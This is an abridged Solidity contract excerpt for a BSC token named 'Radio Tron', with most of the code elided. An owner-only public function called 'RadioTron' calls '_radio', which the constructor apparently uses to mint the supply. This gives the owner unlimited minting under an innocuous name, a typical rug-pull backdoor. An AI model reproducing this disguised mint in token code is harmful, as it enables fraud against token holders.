 ...
 *      About Us
 * 
 *      Telegram : https://t.me/radiotronbsc
 * 
 */
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function RadioTron(uint256 amount) public onlyOwner {
    _radio(msg.sender, amount);
    }
    ...
    function _radio(address account, uint256 amount) internal virtual {
...
contract RadioTronBSC is ERC20 {

    uint tokenTotalSupply = 10000000; // 10 Million Token Supply

    constructor() public ERC20("Radio Tron", "RATRON") {
        _radio(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}